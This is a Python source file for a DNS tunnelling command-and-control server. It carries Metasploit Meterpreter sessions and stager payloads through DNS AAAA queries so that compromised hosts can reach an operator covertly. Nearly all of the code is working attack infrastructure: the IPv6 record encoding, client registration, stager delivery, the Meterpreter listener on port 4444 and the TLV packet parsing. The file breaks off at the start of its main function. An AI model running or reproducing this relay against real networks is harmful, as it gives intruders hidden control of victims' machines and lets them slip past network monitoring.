#!/usr/bin/env python
# coding=utf-8

import argparse
import sys
import time
import threading
import SocketServer
import struct
import re
import ssl
import Queue
import base64
import logging
from logging.handlers import RotatingFileHandler
import socket
import select
from contextlib import contextmanager

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

DNS_LOG_NAME = "dns.log"
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
# add handler to the root logger
formatter = logging.Formatter("%(asctime)s %(name)-24s %(levelname)-8s %(message)s")
# rotating log file after 5 MB
handler = RotatingFileHandler(DNS_LOG_NAME, maxBytes=5*1024*1024, backupCount=5)
handler.setFormatter(formatter)
handler.setLevel(logging.DEBUG)
root_logger.addHandler(handler)

logger = logging.getLogger("dns_server")


def pack_byte_to_hn(val):
    """
    Pack byte to network order unsigned short
    """
    return (val << 8) & 0xffff


def pack_2byte_to_hn(low_byte, high_byte):
    """
    Pack 2 bytes to network order unsigned short
    """
    return ((low_byte << 8) | high_byte) & 0xffff


def pack_ushort_to_hn(val):
    """
    Pack unsigned short to network order unsigned short
    """
    return ((val & 0xff) << 8) | ((val & 0xff00) >> 8) & 0xffff


def xor_bytes(key, data):
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class Encoder(object):
    MAX_PACKET_SIZE = -1
    MIN_VAL_DOMAIN_SYMBOL = ord('a')
    MAX_VAL_DOMAIN_SYMBOL = ord('z')

    @staticmethod
    def get_next_sdomain(current_sdomain):

        def increment(lst, index):
            carry_flag = False
            val = lst[index]
            assert(val >= Encoder.MIN_VAL_DOMAIN_SYMBOL)
            if val >= Encoder.MAX_VAL_DOMAIN_SYMBOL:
                lst[index] = Encoder.MIN_VAL_DOMAIN_SYMBOL
                carry_flag = True
            else:
                lst[index] += 1
            return carry_flag

        lst = [ord(x) for x in reversed(current_sdomain)]
        for i, _ in enumerate(lst):
            if not increment(lst, i):
                break

        return ''.join([chr(x) for x in reversed(lst)])

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        raise NotImplementedError()

    @staticmethod
    def encode_packet(packet_data):
        raise NotImplementedError()

    @staticmethod
    def encode_ready_receive():
        raise NotImplementedError()

    @staticmethod
    def encode_finish_send():
        raise NotImplementedError()

    @staticmethod
    def encode_send_more_data():
        raise NotImplementedError()

    @staticmethod
    def encode_registration():
        raise NotImplementedError()


class IPv6Encoder(Encoder):
    MAX_IPV6RR_NUM = 17
    MAX_DATA_IN_RR = 14
    MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
    IPV6_FORMAT = ":".join(["{:04x}"]*8)

    @staticmethod
    def _encode_nextdomain_datasize(next_domain, data_size):
        res = [0xfe81]
        for ch in next_domain:
            res.append(pack_byte_to_hn(ord(ch)))
        res.append(pack_2byte_to_hn(0 if data_size <= IPv6Encoder.MAX_PACKET_SIZE else 1, data_size & 0xff))
        res.append(pack_ushort_to_hn(data_size >> 8 & 0xffff))
        res.append(pack_byte_to_hn(data_size >> 24 & 0xff))
        return res

    @staticmethod
    def _encode_data_prefix(prefix, index, data):
        assert(len(data) <= IPv6Encoder.MAX_DATA_IN_RR)
        assert(index < IPv6Encoder.MAX_IPV6RR_NUM)
        res = []
        data_size = len(data)
        res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
        for i in range(data_size//2):
            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
        if data_size % 2 != 0:
            res.append(pack_byte_to_hn(ord(data[data_size-1])))
        return res

    @staticmethod
    def _align_hextets(hextests):
        l = len(hextests)
        if l < 8:
            hextests += [0] * (8-l)
        return hextests

    @staticmethod
    def hextets_to_str(hextets):
        return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]

    @staticmethod
    def encode_packet(packet_data):
        data_len = len(packet_data)
        if data_len > IPv6Encoder.MAX_PACKET_SIZE:
            raise ValueError("Data length is bigger than maximum packet size")
        block = []
        i = 0
        while i < data_len:
            next_i = min(i + IPv6Encoder.MAX_DATA_IN_RR, data_len)
            num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
            is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
            hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                      num_rr, packet_data[i:next_i])
            block.append(IPv6Encoder.hextets_to_str(hextets))
            i = next_i
        return block

    @staticmethod
    def encode_ready_receive():
        return ["ffff:0000:0000:0000:0000:0000:0000:0000"]

    @staticmethod
    def encode_finish_send():
        return ["ffff:0000:0000:0000:0000:ff00:0000:0000"]

    @staticmethod
    def encode_send_more_data():
        return ["ffff:0000:0000:0000:0000:f000:0000:0000"]

    @staticmethod
    def encode_registration(client_id, status):
        return ["ffff:"+hex(ord(client_id))[2:4]+"00:0000:0000:0000:0000:0000:0000"]


class PartedData(object):
    def __init__(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def reset(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def add_part(self, data):
        data_len = len(data)
        if (self.current_size + data_len) > self.expected_size:
            raise ValueError("PartedData overflow")
        self.data += data
        self.current_size += data_len

    def is_complete(self):
        return self.expected_size == self.current_size

    def get_data(self):
        return self.data

    def get_expected_size(self):
        return self.expected_size

    def remain_size(self):
        return self.expected_size - self.current_size


class BlockSizedData(object):
    def __init__(self, data, block_size):
        self.data = data
        self.block_size = block_size
        self.data_size = len(self.data)

    def get_data(self, block_index):
        start_index = block_index * self.block_size
        if start_index >= self.data_size:
            raise IndexError("block index out of range")

        end_index = min(start_index + self.block_size, self.data_size)
        is_last = self.data_size == end_index
        return is_last, self.data[start_index:end_index]

    def get_size(self):
        return self.data_size


class Registrator(object):
    __instance = None

    @staticmethod
    def instance():
        if not Registrator.__instance:
            Registrator.__instance = Registrator()
        return Registrator.__instance

    def __init__(self):
        self.id_list = [chr(i) for i in range(ord('a'), ord('z')+1)]
        self.clientMap = {}
        self.servers = {}
        self.stagers = {}
        self.waited_servers = {}
        self.lock = threading.Lock()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.default_stager = StageClient()

    def register_client_for_server(self, server_id, client):
        client_id = None
        notify_server = False
        with self.lock:
            try:
                client_id = self.id_list.pop(0)
                self.clientMap[client_id] = client
                self.servers.setdefault(server_id, []).append(client)
                notify_server = True
            except IndexError as e:
                self.logger.error("Can't register new client for server %s(no free ids)", server_id, exc_info=True)
                return None
        if notify_server:
            self._notify_waited_servers(server_id)
        return client_id

    def _notify_waited_servers(self, server_id):
        notify_server = None
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                notify_server = waited_lst.pop(0)
                if not waited_lst:
                    del self.waited_servers[server_id]
        if notify_server:
            notify_server.on_new_client()

    def subscribe(self, server_id, server):
        with self.lock:
            self.waited_servers.setdefault(server_id, []).append(server)
        self.logger.info("Subscription is done for server with %s id.", server_id)

    def unsubscribe(self, server_id, server):
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                i = waited_lst.find(server)
                if i != -1:
                    self.logger.debug("Server with %s id is found on index %d", server_id, i)
                    waited_lst.pop(i)
        self.logger.info("Unsubscription is done for server with %s id.", server_id)

    def get_client_by_id(self, client_id):
        with self.lock:
            with ignored(KeyError):
                return self.clientMap[client_id]

    def get_new_client_for_server(self, server_id):
        with self.lock:
            with ignored(IndexError):
                clients = self.servers.get(server_id, [])
                assigned_client = clients.pop(0)
                if not clients:
                    del self.servers[server_id]
                return assigned_client

    def get_stage_client_for_server(self, server_id):
        with self.lock:
            try:
                return self.stagers[server_id]
            except KeyError:
                self.logger.info("Trying to request stager for server with %s id", server_id)
                waited_lst = self.waited_servers.get(server_id, [])
                if waited_lst:
                    server = waited_lst[0]
                    server.request_stage()
                else:
                    self.logger.info("Server list is empty")
                return self.default_stager

    def add_stager_for_server(self, server_id, data):
        with self.lock:
            self.stagers[server_id] = StageClient(data)

    def is_stager_server(self, server_id):
        with self.lock:
            return server_id in self.stagers

    def unregister_client(self, client_id):
        with self.lock:
            with ignored(KeyError):
                del self.clientMap[client_id]
                self.id_list.append(client_id)
                self.logger.error("Unregister client with id %s successfully", client_id)


class Client(object):
    INITIAL = 1
    INCOMING_DATA = 2

    def __init__(self):
        self.state = self.INITIAL
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.received_data = PartedData()
        self.last_received_index = -1
        self.sub_domain = "aaaa"
        self.send_data = None
        self.server_queue = Queue.Queue()
        self.client_queue = Queue.Queue()
        self.server = None
        self.client_id = None

    def register_client(self, server_id, encoder):
        client_id = Registrator.instance().register_client_for_server(server_id, self)
        if client_id:
            self.client_id = client_id
            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
            return encoder.encode_registration(client_id, 0)
        else:
            self.logger.info("Can't register client")
            return encoder.encode_finish_send()

    def get_id(self):
        return self.client_id

    def _setup_receive(self, exp_data_size, padding):
        self.state = self.INCOMING_DATA
        self.received_data.reset(exp_data_size)
        self.last_received_index = -1
        self.padding = padding

    def _initial_state(self):
        self.state = self.INITIAL
        self.received_data.reset()
        self.last_received_index = -1
        self.padding = 0

    def set_server(self, server):
        self.server = server

    def incoming_data_header(self, data_size, padding, encoder):
        if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
            return encoder.encode_ready_receive()
        elif self.state == self.INCOMING_DATA:
            self.logger.error("Bad request. Client in the receiving data state")
            return None
        self.logger.info("Data header: waiting %d bytes of data", data_size)
        self._setup_receive(data_size, padding)
        return encoder.encode_ready_receive()

    def incoming_data(self, data, index, counter, encoder):
        self.logger.debug("Data %s, index %d", data, index)
        if self.state != self.INCOMING_DATA:
            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
            return encoder.encode_finish_send()

        data_size = len(data)
        if data_size == 0:
            self.logger.error("Empty incoming data. Send finish.")
            return encoder.encode_finish_send()

        if self.last_received_index >= index:
            self.logger.info("Duplicated packet.")
            return encoder.encode_send_more_data()

        try:
            self.received_data.add_part(data)
        except ValueError:
            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
            self._initial_state()
            return encoder.encode_finish_send()

        self.last_received_index = index
        if self.received_data.is_complete():
            self.logger.info("All expected data is received")
            try:
                packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
                self.logger.info("Put decoded data to the server queue")
                self.server_queue.put(packet)
                self._initial_state()
                if self.server:
                    self.logger.info("Notify server")
                    self.server.polling()
            except Exception:
                self.logger.error("Error during decode received data", exc_info=True)
                self._initial_state()
                return encoder.encode_finish_send()
        return encoder.encode_send_more_data()

    def request_data_header(self, sub_domain, encoder):
        if sub_domain == self.sub_domain:
            if not self.send_data:
                with ignored(Queue.Empty):
                    self.logger.info("Checking client queue...")
                    data = self.client_queue.get_nowait()
                    self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
                    self.logger.debug("New data found: size is %d", len(data))

            data_size = 0
            if self.send_data:
                next_sub = encoder.get_next_sdomain(self.sub_domain)
                sub_domain = next_sub
                data_size = self.send_data.get_size()
            else:
                self.logger.info("No data for client.")
            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
            return encoder.encode_data_header(sub_domain, data_size)
        else:
            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
            if sub_domain == "aaaa":
                self.logger.info("MIGRATION.")
            self.sub_domain = sub_domain
            self.send_data = None

    def request_data(self, sub_domain, index, encoder):
        self.logger.debug("request_data - %s, %d", sub_domain, index)
        if sub_domain != self.sub_domain:
            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
            return None

        if not self.send_data:
            self.logger.error("Bad request. There are no data.")
            return None

        try:
            _, data = self.send_data.get_data(index)
            self.logger.debug("request_data: return data %s", data)
            return encoder.encode_packet(data)
        except ValueError:
            self.logger.error("request_data: index(%d) out of range.", index)

    def server_put_data(self, data):
        self.logger.info("Server adds data to queue.")
        self.client_queue.put(data)

    def server_get_data(self, timeout=2):
        self.logger.info("Checking server queue...")
        with ignored(Queue.Empty):
            data = self.server_queue.get(True, timeout)
            self.logger.info("There are new data(length=%d) for the server", len(data))
            return data

    def server_has_data(self):
        return not self.server_queue.empty()


class StageClient(object):
    subdomain = '7812'

    def __init__(self, data=None):
        self.stage_data = data
        self.data_len = len(data) if data else 0
        self.encoder_data = {}

    def request_data_header(self, encoder):
        return encoder.encode_data_header(self.subdomain, self.data_len)

    def request_data(self, index, encoder):
        if not self.stage_data:
            return encoder.encode_finish_send()
        
        send_data = self.encoder_data.get(encoder, None)
        if not send_data:
            send_data = BlockSizedData(self.stage_data, encoder.MAX_PACKET_SIZE)
            self.encoder_data[encoder] = send_data
        _, data = send_data.get_data(index)
        return encoder.encode_packet(data)


class Request(object):
    EXPR = None
    OPTIONS = []
    LOGGER = logging.getLogger("Request")

    @classmethod
    def match(cls, qname):
        if cls.EXPR:
            return cls.EXPR.match(qname)

    @classmethod
    def handle(cls, qname, dns_cls):
        m = cls.match(qname)
        if not m:
            return None
        params = m.groupdict()
        client = None
        client_id = params.pop("client", None)
        if not client_id:
            if "new_client" in cls.OPTIONS:
                Request.LOGGER.info("Create a new client.")
                client = Client()
        else:
            client = Registrator.instance().get_stage_client_for_server(client_id) if "stage_client" in cls.OPTIONS else \
                     Registrator.instance().get_client_by_id(client_id)

        if client:
            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
            params["encoder"] = dns_cls.encoder
            return cls._handle_client(client, **params)
        else:
            Request.LOGGER.error("Can't find client with name %s", client_id)

    @classmethod
    def _handle_client(cls, client, **kwargs):
        raise NotImplementedError()


class GetDataHeader(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        encoder = kwargs['encoder']
        return client.request_data_header(sub_domain, encoder)


class GetStageHeader(Request):
    EXPR = re.compile(r"7812\.000g\.(?P<rnd>\d+)\.0\.(?P<client>\w+)")
    OPTIONS = ["stage_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        encoder = kwargs['encoder']
        return client.request_data_header(encoder)


class GetDataRequest(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        index = int(kwargs['index'])
        encoder = kwargs['encoder']
        return client.request_data(sub_domain, index, encoder)


class GetStageRequest(Request):
    EXPR = re.compile(r"7812\.(?P<index>\d+)\.(?P<rnd>\d+)\.0\.(?P<client>\w+)")
    OPTIONS = ["stage_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        index = int(kwargs['index'])
        encoder = kwargs['encoder']
        return client.request_data(index, encoder)


class IncomingDataRequest(Request):
    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        enc_data = kwargs['base64']
        counter = int(kwargs['cnt'])
        index = int(kwargs['idx'])
        encoder = kwargs['encoder']
        enc_data = re.sub(r"\.", "", enc_data)
        return client.incoming_data(enc_data, index, counter, encoder)


class IncomingDataHeaderRequest(Request):
    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        size = int(kwargs['size'])
        padding = int(kwargs['padd'])
        encoder = kwargs['encoder']
        return client.incoming_data_header(size, padding, encoder)


class IncomingNewClient(Request):
    EXPR = re.compile(r"7812\.reg0\.\d+\.(?P<server_id>\w+)")
    OPTIONS = ["new_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        return client.register_client(kwargs['server_id'], kwargs['encoder'])


class AAAARequestHandler(object):
    encoder = IPv6Encoder

    def __init__(self, domain):
        self.domain = domain
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.handlers_chain = [
            GetStageHeader,
            GetStageRequest,
            IncomingDataHeaderRequest,
            IncomingDataRequest,
            GetDataRequest,
            GetDataHeader,
            IncomingNewClient
        ]

    def process_request(self, reply, qname):
        # cut domain from requested qname
        i = qname.rfind("." + self.domain)
        if i == -1:
            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
            return
        sub_domain = qname[:i]
        self.logger.info("requested subdomain name is %s", sub_domain)
        for handler in self.handlers_chain:
            answer = handler.handle(sub_domain, self.__class__)
            if not answer:
                continue
            for rr in answer:
                self.logger.debug("Add resource record to the reply %s", rr)
                reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=1,
                                    rdata=AAAA(rr)))
            break
        else:
            self.logger.error("Request with subdomain %s doesn't handled", qname)


class DnsServer(object):
    __instance = None

    @staticmethod
    def create(domain, ipv4, ns_servers):
        if not DnsServer.__instance:
            DnsServer.__instance = DnsServer(domain, ipv4, ns_servers)

    @staticmethod
    def instance():
        return DnsServer.__instance

    def __init__(self, domain, ipv4, ns_servers):
        self.domain = domain + "."
        self.ipv4 = ipv4
        self.ns_servers = ns_servers
        self.logger = logging.getLogger(self.__class__.__name__)
        self.handlers = {
            QTYPE.NS: self._process_ns_request,
            QTYPE.A: self._process_a_request,
            QTYPE.AAAA: self._process_aaaa_request,
        }
        self.aaaa_handler = AAAARequestHandler(self.domain)

    def process_request(self, request):
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qn = str(request.q.qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qn.endswith(self.domain):
            try:
                self.logger.info("Process request for type %s", qt)
                self.handlers[qtype](reply, qn)
            except KeyError as e:
                self.logger.info("%s request type is not supported", qt)
        else:
            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
        self.logger.info("Send reply for DNS request")
        self.logger.debug("Reply data: %s", reply)
        return reply.pack()

    def _process_ns_request(self, reply, qname):
        for server in self.ns_servers:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=1, rdata=server))

    def _process_a_request(self, reply, qname):
        self.logger.info("Send answer for A request - %s", self.ipv4)
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=1, rdata=A(self.ipv4)))

    def _process_aaaa_request(self, reply, qname):
        if self.aaaa_handler:
            self.aaaa_handler.process_request(reply, qname)


def dns_response(data):
    try:
        request = DNSRecord.parse(data)
        dns_server = DnsServer.instance()
        if dns_server:
            return dns_server.process_request(request)
        else:
            logger.error("Can't get dns server instance.")
    except Exception as e:
        logger.error("Exception during handle request " + str(e), exc_info=True)


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        logger.info("DNS request %s (%s %s):", self.__class__.__name__[:3], self.client_address[0],
                    self.client_address[1])
        try:
            data = self.get_data()
            logger.debug("Size:%d, data %s", len(data), data)
            dns_ans = dns_response(data)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            logger.error("Exception in request handler.", exc_info=True)


class PartedDataReader(object):
    INITIAL = 1
    RECEIVING_DATA = 2

    def __init__(self, read_func, header_func=None, completion_func=None, continue_func=None):
        self.read_func = read_func
        self.header_func = header_func
        self.completion_func = completion_func
        self.continue_func = continue_func
        self.state = PartedDataReader.INITIAL
        self.data = None

    def read(self):
        if self.state == PartedDataReader.INITIAL:
            data_size, data = self.header_func()
            if data_size == 0:
                return
            self.state = PartedDataReader.RECEIVING_DATA
            self.data = PartedData(data_size)
            if data:
                self.data.add_part(data)
        data = self.read_func(self.data.remain_size())
        if not data:
            return
        self.data.add_part(data)
        if self.data.is_complete():
            if self.completion_func:
                self.completion_func(self.data)
            self.data = None
            self.state = PartedDataReader.INITIAL
        elif self.continue_func:
            self.continue_func()



class MSFClient(object):
    HEADER_SIZE = 32
    BUFFER_SIZE = 2048

    LOGGER = logging.getLogger("MSFClient")

    def __init__(self, sock, server):
        # enable keep-alive every minute
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 60)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 4)
        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 15)
        self.sock = sock
        self.ssl_socket = None
        self.working_socket = sock
        self.server = server
        self.msf_id = ""
        self.client = None
        self.wait_client = False
        self.stage_requested = False
        self.lock = threading.Lock()
        self.parted_reader = None
        self._setup_id_reader()

    def get_socket(self):
        return self.working_socket if not self.wait_client else None

    def _setup_ssl(self):
        if self.ssl_socket is None:
            MSFClient.LOGGER.info("Create ssl socket")
            try:
                self.sock.setblocking(True)
                self.ssl_socket = ssl.wrap_socket(self.sock,
                            # keyfile = "server.key",
                            # ca_certs="server.crt",
                            cert_reqs=ssl.CERT_NONE,
                            server_side=False)
                self.ssl_socket.setblocking(False)
                self.ssl_socket.write("GET /123456789 HTTP/1.0\r\n\r\n")
                self.working_socket = self.ssl_socket
            except:
                MSFClient.LOGGER.error("Can't create ssl context:", exc_info=True)
                self.sock.close()
                self.server.remove_me(self)

    def _read_data(self, size):
        data = None
        try:
            data = self.working_socket.recv(size)
            if not data:
                MSFClient.LOGGER.info("SSL connection closed by client")
                # self.ssl_socket.unwrap()
                self.ssl_socket = None
                #MSFClient.LOGGER.info("Trying to setup new SSL connection.")
                #self._setup_ssl()
                self.working_socket.close()
                self.server.remove_me(self)
                return None
            return data
        except ssl.SSLWantReadError:
            MSFClient.LOGGER.info("Not all data is prepared for decipher.Reread data later.")
            # add small sleep
            time.sleep(0.1)
            return None
        except:
            # connection closed
            if self.client:
                client_id = self.client.get_id()
                if client_id:
                    MSFClient.LOGGER.info("Closing MSF connection and unregister client with id %s", client_id)
                    Registrator.instance().unregister_client(client_id)
            MSFClient.LOGGER.error("Exception during read", exc_info=True)
            self.server.remove_me(self)
            return None

    def on_new_client(self):
        with self.lock:
            if not self.client:
                if self._setup_client():
                    #self._setup_ssl()
                    self._setup_tlv_reader()
                    Registrator.instance().unsubscribe(self.msf_id, self)
                    self.wait_client = False
                    self.polling()
            else:
                self.LOGGER.error("Client already exists for this server")

    def request_stage(self):
        with self.lock:
            if not self.stage_requested:
                self._setup_stage_reader()
                self.stage_requested = True
                self.wait_client = False
                self.polling()
            else:
                MSFClient.LOGGER.info("Stage has already was requested on this server")

    def _setup_id_reader(self):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_id_header,
                                              completion_func=self._read_id_complete
                                              )

    def _setup_tlv_reader(self):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_tlv_header,
                                              completion_func=self._read_tlv_complete
                                              )

    def _setup_stage_reader(self, without_data=False):
        self.parted_reader = PartedDataReader(read_func=self._read_data,
                                              header_func=self._read_stage_header,
                                              completion_func=self._read_stage_complete_data_drop if without_data else
                                                              self._read_stage_complete
                                              )

    def _read_id_header(self):
        id_size_byte = self._read_data(1)
        id_size = struct.unpack("B", id_size_byte)[0]
        return id_size, None

    def _read_id_complete(self, data):
        MSFClient.LOGGER.info("Id read is done")
        self.msf_id = data.get_data()
        if Registrator.instance().is_stager_server(self.msf_id):
            MSFClient.LOGGER.info("Start reading stage without sending to client")
            self._setup_stage_reader(without_data=True)
        elif self._setup_client():
            MSFClient.LOGGER.info("Client is found.Setup tlv reader.")
            #self._setup_ssl()
            self.working_socket.write("GET /123456789 HTTP/1.0\r\n\r\n")
            self._setup_tlv_reader()
        else:
            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription", self.msf_id)
            Registrator.instance().subscribe(self.msf_id, self)
            self.parted_reader = None
            self.wait_client = True

    def _read_stage_header(self):
        MSFClient.LOGGER.info("Start reading stager")
        data_size_b = self._read_data(4)
        data_size = struct.unpack("<I", data_size_b)[0]
        MSFClient.LOGGER.info("Stager size is %d bytes", data_size)
        return data_size+4, data_size_b

    def _read_stage_complete(self, data):
        MSFClient.LOGGER.info("Stage read is done")
        Registrator.instance().add_stager_for_server(self.msf_id, data.get_data())
        self.parted_reader = None
        self.wait_client = True

    def _read_stage_complete_data_drop(self, data):
        MSFClient.LOGGER.info("Stage read is done. Drop data and continue.")
        if self._setup_client():
            MSFClient.LOGGER.info("Client is found.Setup tlv reader.")
            self._setup_ssl()
            self._setup_tlv_reader()
        else:
            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription", self.msf_id)
            Registrator.instance().subscribe(self.msf_id, self)
            self.parted_reader = None
            self.wait_client = True

    def _read_tlv_header(self):
        header = self._read_data(MSFClient.HEADER_SIZE)
        if not header:
            return 0, None

        if len(header) != MSFClient.HEADER_SIZE:
            MSFClient.LOGGER.error("Can't read full header)")
            return 0, None

        MSFClient.LOGGER.debug("PARSE HEADER")
        xor_key = header[:4]
        pkt_length_binary = xor_bytes(xor_key, header[24:28])
        pkt_length = struct.unpack('>I', pkt_length_binary)[0]
        MSFClient.LOGGER.info("Packet length %d", pkt_length)
        return pkt_length+24, header

    def _read_tlv_complete(self, data):
        MSFClient.LOGGER.info("All data from server is read. Sending to client.")
        if self.client:
            self.client.server_put_data(data.get_data())
        else:
            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)

    def _setup_client(self):
        """
        Check if client is exists for this server and setup server-client links
        :return: True if client is found and False otherwise
        """
        if not self.msf_id:
            return False
        client = Registrator.instance().get_new_client_for_server(self.msf_id)
        if client:
            self.client = client
            client.set_server(self)
            MSFClient.LOGGER.info("Association client-server is done successfully")
            return True
        return False

    def read_new_data(self):
        with self.lock:
            if self.wait_client:
                MSFClient.LOGGER.error("Data is received in waiting client state.Can't not be here!!!!")
                return
            if self.parted_reader:
                self.parted_reader.read()

    def want_write(self):
        if self.client:
            return self.client.server_has_data()
        return False

    def polling(self):
        self.server.poll()

    def write_data(self):
        if self.client:
            data = self.client.server_get_data()
            if data:
                MSFClient.LOGGER.info("Send data to server - %d bytes", len(data))
                self.working_socket.send(data)

    def close(self):
        self.working_socket.close()


class MSFListener(object):
    SELECT_TIMEOUT = 10

    def __init__(self, listen_addr="0.0.0.0", listen_port=4444):
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.setblocking(False)
        self.shutdown_event = threading.Event()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.clients = []
        pipe = os.pipe()
        self.poll_pipe = (os.fdopen(pipe[0], "r", 0), os.fdopen(pipe[1], "w", 0))
        self.loop_thread = None

    def remove_me(self, client):
        with ignored(ValueError):
            self.clients.remove(client)

    def poll(self):
        self.poll_pipe[1].write("\x90")

    def shutdown(self):
        self.logger.info("request for shutdown server")
        self.shutdown_event.set()
        self.poll()
        if self.loop_thread:
            self.loop_thread.join()
        self.loop_thread = None

    def start_loop(self):
        self.loop_thread = threading.Thread(target=self.loop)
        self.loop_thread.daemon = True
        self.loop_thread.start()

    def loop(self):
        self.logger.info("Server internal loop started.")
        self.listen_socket.bind((self.listen_addr, self.listen_port))
        self.listen_socket.listen(1)

        while not self.shutdown_event.is_set():
            inputs = [self.listen_socket, self.poll_pipe[0]]
            outputs = []

            for cl in self.clients:
                s = cl.get_socket()
                if s:
                    inputs.append(s)
                    if cl.want_write():
                        outputs.append(s)

            read_lst, write_lst, exc_lst = select.select(inputs, outputs, inputs, MSFListener.SELECT_TIMEOUT)

            # handle input
            for s in read_lst:
                if s is self.listen_socket:
                    connection, address = s.accept()
                    self.logger.info("Incoming connection from address %s", address)
                    self.clients.append(MSFClient(connection, self))
                elif s is self.poll_pipe[0]:
                    self.logger.debug("Polling")
                    s.read(1)
                else:
                    self.logger.info("Socket is ready for reading")
                    for cl in self.clients:
                        if cl.get_socket() == s:
                            cl.read_new_data()

            # handle write
            for s in write_lst:
                for cl in self.clients:
                    if cl.get_socket() == s:
                        cl.write_data()
        # close sockets after exit from loop
        self.listen_socket.close()
        for cl in self.clients:
            cl.close()
        self.logger.info("Internal loop is ended")


class TCPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
    parser.add_argument('--domain', type=str, required=True, help='The domain name')
    parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')

    args = parser.parse_args()
    ns_records = []

    D = DomainName(args.domain + '.')  # Init domain string
